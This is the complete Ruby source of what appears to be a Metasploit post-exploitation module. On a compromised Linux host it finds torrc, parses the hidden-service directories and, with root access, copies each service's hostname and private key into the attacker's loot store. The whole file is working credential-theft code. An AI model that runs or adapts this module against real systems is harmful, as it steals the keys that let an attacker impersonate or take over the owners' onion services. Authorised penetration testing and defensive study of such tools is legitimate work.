##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# Adapted from post/linux/gather/enum_configs.rb
##

class MetasploitModule < Msf::Post

  include Msf::Post::Linux::System
  include Msf::Post::Linux::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Gather TOR Hidden Services',
      'Description'   => %q{
        This module collects the hostnames name and private keys of
	any TOR Hidden Services running on the target machine. It
	will search for torrc and if found, will parse it for the
	directories of Hidden Services. However, root permissions
	are required to read them as they are owned by the user that
	TOR runs as, usually a separate account.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Harvey Phillips <xcellerator[at]gmx.com>',
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    distro = get_sysinfo
    h = get_host
    print_status("Running module against #{h}")
    print_status("Info:")
    print_status("\t#{distro[:version]}")
    print_status("\t#{distro[:kernel]}")
    print_status("Looking for torrc...")
    find_torrc
  end

  def save(file, data, ltype, ctype="text/plain")
    fname = ::File.basename(file)
    loot = store_loot(ltype, ctype, session, data, fname)
    print_status("#{fname} stored in #{loot.to_s}")
  end

  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = cmd_exec("hostname").chomp
    end

    return host
  end

  def find_torrc
    config = cmd_exec("find / -name 'torrc' 2>/dev/null | head -n 1").chomp
    if config != ""
    	print_good("Torrc file found at #{config}")
	hiddenservices = cmd_exec("cat #{config} | grep HiddenServiceDir | grep -v '#' | cut -d ' ' -f 2").split("\n")
	print_good("Hidden Services found!")

	if is_root?
		hiddenservices.each do |f|
			output = read_file("#{f}hostname")
			save(f, output, "tor.#{f.split("/")[-1]}.hostname") if output && output !~ /No such file or directory/
		end

		hiddenservices.each do |f|
			output = read_file("#{f}private_key")
			save(f, output, "tor.#{f.split("/")[-1]}.privatekey") if output && output !~ /No such file or directory/
		end
	else
		print_error("Hidden Services were found, but we need root to access the directories")
	end
    else
	print_error("No Torrc file found. Perhaps it goes by another name?")
    end
  end
end
